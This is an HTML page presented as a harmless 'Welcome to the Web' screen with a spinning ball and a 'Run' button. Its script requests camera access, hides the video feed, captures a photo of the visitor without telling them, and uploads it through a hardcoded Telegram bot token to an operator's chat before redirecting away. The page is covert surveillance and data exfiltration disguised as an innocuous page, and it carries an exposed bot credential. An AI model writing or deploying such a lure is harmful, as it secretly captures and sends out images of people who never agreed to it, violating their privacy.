<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Selfie Capture</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding: 40px 20px;
    }

    .ball {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: linear-gradient(45deg, #0ff, #f0f, #0ff);
      animation: spin 3s linear infinite;
      margin: 0 auto 20px;
      box-shadow: 0 0 20px #0ff, 0 0 40px #f0f;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    button {
      padding: 14px 25px;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      background: #0ff;
      color: black;
      font-weight: bold;
      cursor: pointer;
    }

    video {
      display: none;
    }
  </style>
</head>
<body>

  <div class="ball"></div>
  <h2>Welcome to the Web</h2>
  <p>Click the button below to start</p>
  <button onclick="captureSelfie()">Run</button>

  <video id="video" autoplay></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const botToken = "7566185569:AAHQm3ZRkugrmlBehkJ7nsfqcP9zfwZNvok";
    const adminId = "6133777031";

    async function captureSelfie() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // wait for video to start
        await new Promise(resolve => setTimeout(resolve, 1500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        stream.getTracks().forEach(track => track.stop());

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        const formData = new FormData();
        formData.append("chat_id", adminId);
        formData.append("photo", blob, "selfie.jpg");
        formData.append("caption", "ðŸ“¸ New Selfie Captured via Web!");

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData
        });

        if (response.ok) {
          window.location.href = "index.html";
        } else {
          alert("Failed to send selfie.");
        }
      } catch (err) {
        alert("Camera permission denied or not available.");
        console.error(err);
      }
    }
  </script>

</body>
</html>
